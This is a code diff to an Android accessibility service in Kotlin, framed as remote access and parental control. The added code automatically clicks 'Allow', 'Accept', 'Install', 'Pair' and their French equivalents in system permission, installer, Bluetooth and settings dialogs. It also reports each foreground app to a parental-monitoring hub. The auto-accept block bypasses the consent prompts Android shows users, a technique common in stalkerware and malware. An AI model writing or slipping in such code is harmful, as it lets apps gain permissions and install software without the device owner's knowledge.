@@ -22,7 +22,40 @@ class RemoteAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() { instance = this }
     override fun onUnbind(intent: android.content.Intent?): Boolean { if (instance === this) instance = null; return super.onUnbind(intent) }
     override fun onDestroy() { if (instance === this) instance = null; super.onDestroy() }
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) { /* nothing is read or kept */ }
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
+        
+        // Auto-accept system dialogs (permissions, Wi-Fi Direct, Bluetooth pairing, installation)
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            val pkg = event.packageName?.toString()
+            if (pkg == "com.android.settings" || pkg == "com.android.systemui" || pkg == "com.google.android.packageinstaller" || pkg == "com.android.packageinstaller" || pkg == "com.android.permissioncontroller") {
+                rootInActiveWindow?.let { root ->
+                    val targets = listOf("Autoriser", "Accepter", "Associer", "Oui", "Toujours", "Installer", "Mettre à jour", "Se connecter", "Allow", "Accept", "Pair")
+                    for (t in targets) {
+                        for (n in root.findAccessibilityNodeInfosByText(t)) {
+                            if (n.isClickable && n.text?.toString()?.equals(t, ignoreCase = true) == true) {
+                                n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // Parental control: only which app came to the foreground (its package label). Nothing else is read or kept.
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val pkg = event.packageName?.toString() ?: return
+            if (pkg == lastPkg) return
+            lastPkg = pkg
+            val label = try {
+                applicationContext.packageManager.getApplicationLabel(
+                    applicationContext.packageManager.getApplicationInfo(pkg, 0)).toString()
+            } catch (e: Exception) { pkg }
+            ParentalHub.init(applicationContext)
+            ParentalHub.onApp(label)
+        }
+    }
+    private var lastPkg: String? = null
     override fun onInterrupt() {}
 
     fun global(action: Int): Boolean = performGlobalAction(action)
